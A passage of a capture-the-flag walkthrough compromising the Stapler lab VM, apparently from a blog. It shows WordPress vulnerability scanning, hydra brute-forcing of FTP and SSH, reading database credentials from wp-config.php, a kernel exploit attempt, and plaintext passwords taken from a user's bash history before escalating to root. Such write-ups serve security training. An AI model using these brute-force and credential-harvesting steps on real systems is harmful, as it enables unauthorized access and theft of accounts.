    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5492
[i] Fixed in: 4.2.11

[!] Title: WordPress 3.0-4.7 - Cryptographically Weak Pseudo-Random Number Generator (PRNG)
    Reference: https://wpvulndb.com/vulnerabilities/8721
    Reference: https://github.com/WordPress/WordPress/commit/cea9e2dc62abf777e06b12ec4ad9d1aaa49b29f4
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5493
[i] Fixed in: 4.2.11

[!] Title: WordPress 4.2.0-4.7.1 - Press This UI Available to Unauthorised Users
    Reference: https://wpvulndb.com/vulnerabilities/8729
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/21264a31e0849e6ff793a06a17de877dd88ea454
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5610
[i] Fixed in: 4.2.12

[!] Title: WordPress 3.5-4.7.1 - WP_Query SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8730
    Reference: https://wordpress.org/news/2017/01/wordpress-4-7-2-security-release/
    Reference: https://github.com/WordPress/WordPress/commit/85384297a60900004e27e417eac56d24267054cb
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5611
[i] Fixed in: 4.2.12

[!] Title: WordPress 3.6.0-4.7.2 - Authenticated Cross-Site Scripting (XSS) via Media File Metadata
    Reference: https://wpvulndb.com/vulnerabilities/8765
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/28f838ca3ee205b6f39cd2bf23eb4e5f52796bd7
    Reference: https://sumofpwn.nl/advisory/2016/wordpress_audio_playlist_functionality_is_affected_by_cross_site_scripting.html
    Reference: http://seclists.org/oss-sec/2017/q1/563
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6814
[i] Fixed in: 4.2.13

[!] Title: WordPress 2.8.1-4.7.2 - Control Characters in Redirect URL Validation
    Reference: https://wpvulndb.com/vulnerabilities/8766
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/288cd469396cfe7055972b457eb589cea51ce40e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6815
[i] Fixed in: 4.2.13

[!] Title: WordPress  4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS) in YouTube URL Embeds
    Reference: https://wpvulndb.com/vulnerabilities/8768
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/419c8d97ce8df7d5004ee0b566bc5e095f0a6ca8
    Reference: https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6817
[i] Fixed in: 4.2.13

[!] Title: WordPress 4.2-4.7.2 - Press This CSRF DoS
    Reference: https://wpvulndb.com/vulnerabilities/8770
    Reference: https://wordpress.org/news/2017/03/wordpress-4-7-3-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829
    Reference: https://sumofpwn.nl/advisory/2016/cross_site_request_forgery_in_wordpress_press_this_function_allows_dos.html
    Reference: http://seclists.org/oss-sec/2017/q1/562
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6819
[i] Fixed in: 4.2.13

[!] Title: WordPress 2.3-4.7.5 - Host Header Injection in Password Reset
    Reference: https://wpvulndb.com/vulnerabilities/8807
    Reference: https://exploitbox.io/vuln/WordPress-Exploit-4-7-Unauth-Password-Reset-0day-CVE-2017-8295.html
    Reference: http://blog.dewhurstsecurity.com/2017/05/04/exploitbox-wordpress-security-advisories.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8295

[!] Title: WordPress 2.7.0-4.7.4 - Insufficient Redirect Validation
    Reference: https://wpvulndb.com/vulnerabilities/8815
    Reference: https://github.com/WordPress/WordPress/commit/76d77e927bb4d0f87c7262a50e28d84e01fd2b11
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
[i] Fixed in: 4.2.15

[!] Title: WordPress 2.5.0-4.7.4 - Post Meta Data Values Improper Handling in XML-RPC
    Reference: https://wpvulndb.com/vulnerabilities/8816
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d95e3ae816f4d7c638f40d3e936a4be19724381
[i] Fixed in: 4.2.15

[!] Title: WordPress 3.4.0-4.7.4 - XML-RPC Post Meta Data Lack of Capability Checks
    Reference: https://wpvulndb.com/vulnerabilities/8817
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/e88a48a066ab2200ce3091b131d43e2fab2460a4
[i] Fixed in: 4.2.15

[!] Title: WordPress 2.5.0-4.7.4 - Filesystem Credentials Dialog CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8818
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/38347d7c580be4cdd8476e4bbc653d5c79ed9b67
[i] Fixed in: 4.2.15

[!] Title: WordPress 3.3-4.7.4 - Large File Upload Error XSS
    Reference: https://wpvulndb.com/vulnerabilities/8819
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/8c7ea71edbbffca5d9766b7bea7c7f3722ffafa6
[i] Fixed in: 4.2.15

[!] Title: WordPress 3.4.0-4.7.4 - Customizer XSS & CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8820
    Reference: https://wordpress.org/news/2017/05/wordpress-4-7-5/
    Reference: https://github.com/WordPress/WordPress/commit/3d10fef22d788f29aed745b0f5ff6f6baea69af3
[i] Fixed in: 4.2.15

[+] WordPress theme in use: bhost - v1.2.9

[+] Name: bhost - v1.2.9
 |  Location: https://192.168.118.184:12380/blogblog/wp-content/themes/bhost/
 |  Readme: https://192.168.118.184:12380/blogblog/wp-content/themes/bhost/readme.txt
[!] The version is out of date, the latest version is 1.3.6
 |  Style URL: https://192.168.118.184:12380/blogblog/wp-content/themes/bhost/style.css
 |  Theme Name: BHost
 |  Theme URI: Author: Masum Billah
 |  Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This the...
 |  Author: Masum Billah
 |  Author URI: http://getmasum.net/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 10 user/s:
    +----+---------+-----------------+
    | Id | Login   | Name            |
    +----+---------+-----------------+
    | 1  | john    | John Smith      |
    | 2  | elly    | Elly Jones      |
    | 3  | peter   | Peter Parker    |
    | 4  | barry   | Barry Atkins    |
    | 5  | heather | Heather Neville |
    | 6  | garry   | garry           |
    | 7  | harry   | harry           |
    | 8  | scott   | scott           |
    | 9  | kathy   | kathy           |
    | 10 | tim     | tim             |
    +----+---------+-----------------+

[+] Finished: Fri May 19 15:48:19 2017
[+] Requests Done: 56
[+] Memory used: 31.594 MB
[+] Elapsed time: 00:00:00

A couple of problems with injection, but nothing quickly comes up.  I need to run to the store...sounds like a great time to start hydra beating on the ftp server!

root@kali:~/stapler#cat users.txt
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
john
barry
heather
garry
harry
scott
kathy
tim

root@kali:~/stapler# hydra -L users.txt -e nsr -v ftp://192.168.118.184
Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-05-19 16:43:09
[DATA] max 16 tasks per 1 server, overall 64 tasks, 114 login tries (l:38/p:3), ~0 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[21][ftp] host: 192.168.118.184   login: SHayslett   password: SHayslett
[21][ftp] host: 192.168.118.184   login: elly   password: ylle
[STATUS] attack finished for 192.168.118.184 (waiting for children to complete tests)
1 of 1 target successfully completed, 2 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-05-19 16:43:33

root@kali:~# ssh SHayslett@192.168.118.184
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
SHayslett@192.168.118.184's password:
Welcome back!



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/****/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

SHayslett@red:~$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for SHayslett:
SHayslett is not in the sudoers file.  This incident will be reported.
SHayslett@red:~$

Worth a try :)

SHayslett@red:~$ cat /proc/version
Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016

root@kali:~/stapler# searchsploit 4.4.0-21
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter target_offset Out-of-Bounds Pri | lin_x86-64/local/40049.c

SHayslett@red:~$ cp 40049.c pwn.c
SHayslett@red:~$ vi pwn.c
SHayslett@red:~$ mv 40049.c decr.c
SHayslett@red:~$ vi decr.c
SHayslett@red:~$ gcc decr.c -m32 -O2 -o decr
SHayslett@red:~$ gcc pwn.c -O2 -o pwn
pwn.c: In function ‘privesc’:
pwn.c:26:42: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
         commit_creds(prepare_kernel_cred((uint64_t)NULL));
                                          ^
SHayslett@red:~$ ls
decr  decr.c  pwn  pwn.c
SHayslett@red:~$ ./decr
netfilter target_offset Ubuntu 16.04 4.4.0-21-generic exploit by vnik
[-] SMEP/SMAP support dectected! Quitting...

Close, but no.  Time to keep digging.

Hayslett@red:~$ dpkg --get-selections | grep deinstall
libmcrypt4					deinstall
linux-image-4.4.0-22-generic			deinstall
linux-image-extra-4.4.0-22-generic		deinstall
resolvconf					deinstall
SHayslett@red:~$

Nothing overly cool there.  Time to poke around the webapps, see if there are any stored credentals.

SHayslett@red:/var/www$ ls -l
total 4
drwxr-xr-x 5 root root 4096 Jun  5  2016 https

I can write to www, would be an easy place to drop a reverse shell if I needed to keep access and was worried about my account.

SHayslett@red:/var/www/https/blogblog$ more wp-config.php

****snip****

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
**

SHayslett@red:/var/www/https/blogblog$ mysql -u root -p
Enter password:
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 93
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.00 sec)

mysql> use loot;
Database changed
mysql> show tables;
+----------------------------+
| Tables_in_loot             |
+----------------------------+
| actor                      |
| actor_info                 |
| address                    |
| category                   |
| city                       |
| country                    |
| customer                   |
| customer_list              |
| film                       |
| film_actor                 |
| film_category              |
| film_list                  |
| film_text                  |
| inventory                  |
| language                   |
| nicer_but_slower_film_list |
| payment                    |
| rental                     |
| sales_by_film_category     |
| sales_by_store             |
| staff                      |
| staff_list                 |
| store                      |
+----------------------------+
23 rows in set (0.00 sec)

mysql> select username,password from staff;
+----------+------------------------------------------+
| username | password                                 |
+----------+------------------------------------------+
| Mike     | 8cb2237d0679ca88db6464eac60da96345513964 |
| Jon      | NULL                                     |
+----------+------------------------------------------+
2 rows in set (0.00 sec)

mysql>

Neat stuff, but nothing that will help with rooting the box.

Might as well grab the passwd file and start hydra again with a clean list.

SHayslett@red:/var/www/https$ cat /etc/passwd | grep bash
RNunemaker:x:1001:1001::/home/RNunemaker:/bin/bash
ETollefson:x:1002:1002::/home/ETollefson:/bin/bash
DSwanger:x:1003:1003::/home/DSwanger:/bin/bash
AParnell:x:1004:1004::/home/AParnell:/bin/bash
SHayslett:x:1005:1005::/home/SHayslett:/bin/bash
MBassin:x:1006:1006::/home/MBassin:/bin/bash
JBare:x:1007:1007::/home/JBare:/bin/bash
LSolum:x:1008:1008::/home/LSolum:/bin/bash
MFrei:x:1010:1010::/home/MFrei:/bin/bash
SStroud:x:1011:1011::/home/SStroud:/bin/bash
JKanode:x:1013:1013::/home/JKanode:/bin/bash
CJoo:x:1014:1014::/home/CJoo:/bin/bash
Drew:x:1020:1020::/home/Drew:/bin/bash
jess:x:1021:1021::/home/jess:/bin/bash
SHAY:x:1022:1022::/home/SHAY:/bin/bash
mel:x:1024:1024::/home/mel:/bin/bash
zoe:x:1026:1026::/home/zoe:/bin/bash
NATHAN:x:1027:1027::/home/NATHAN:/bin/bash
elly:x:1029:1029::/home/elly:/bin/bash
SHayslett@red:/var/www/https$

root@kali:~/stapler# hydra -L ssh_users.txt -v -t 4 -e nsr ssh://192.168.118.184

I'll just let that run in the background while i poke at the server more.

There was that strange service listening on port 666.  Wonder what we can find from that.

SHayslett@red:/var/www/https$ netstat -lnp

Doesn't give me anything useful, need to be root.  Maybe I can find something in the processes that looks guilty.

SHayslett@red:/var/www/https$ ps aux

****snip****

JKanode   1579  0.0  0.4   6372  4284 ?        Ss   May19   0:00 /lib/systemd/systemd --user
www       1585  0.0  0.1   7896  1556 ?        S    May19   0:00 (sd-pam)
JKanode   1586  0.0  0.1   7896  1616 ?        S    May19   0:00 (sd-pam)
JKanode   1592  0.0  0.2   5436  2864 ?        Ss   May19   0:00 bash -c cd /home/JKanode; python2 -m Sim
www       1593  0.0  0.0   5432   676 ?        Ss   May19   0:00 bash -c authbind php -S 0.0.0.0:80 -t /h
www       1594  0.0  2.4 126008 24616 ?        S    May19   0:01 php -S 0.0.0.0:80 -t /home/www/
JKanode   1595  0.0  0.9  14696  9864 ?        S    May19   0:02 python2 -m SimpleHTTPServer 8888

****snip****

Hey!  I've lost interest in the strange service on 666.  Hello JKanode, what are you doing?

SHayslett@red:/home$ ls -la | grep JKanode
drwxr-xr-x  2 JKanode    JKanode    4096 Jun  5  2016 JKanode

Isn't that handy, I can get into their home directory....and well, everyone else's as well.

SHayslett@red:/home/JKanode$ more .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 peter@localhost
ps -ef
top
kill -9 3747
exit

Well...isn't that convent.

JKanode@192.168.118.184's password:
Welcome back!

JKanode@red:~$ sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for JKanode:
JKanode is not in the sudoers file.  This incident will be reported.

Worth a try :) at least we know that is the right password.  Might as well check peter as well.

peter@192.168.118.184's password:
Welcome back!
This is the Z Shell configuration function for new users,
zsh-newuser-install.
You are seeing this message because you have no zsh startup files
(the files .zshenv, .zprofile, .zshrc, .zlogin in the directory
~).  This function can help you with a few settings that should
make your use of the shell easier.

You can:

(q)  Quit and do nothing.  The function will be run again next time.

(0)  Exit, creating the file ~/.zshrc containing just a comment.
     That will prevent this function being run again.

(1)  Continue to the main menu.

(2)  Populate your ~/.zshrc with the configuration recommended
     by the system administrator and exit (you will need to edit
     the file by hand, if so desired).

--- Type one of the keys in parentheses --- ^C

Aborting.
The function will be run again next time.  To prevent this, execute:
  touch ~/.zshrc
red%
red% whoami
peter
red% sudo su

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter:
➜  peter whoami
root
➜  peter

You don't say!

➜  peter bash
root@red:/home/peter# cd /root
root@red:~# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
root@red:~# more flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b

root@red:~#

I spent longer than i want to admit digging into wordpress.  I'm sure there is something there to find, but a simple bad password was enough to get in.
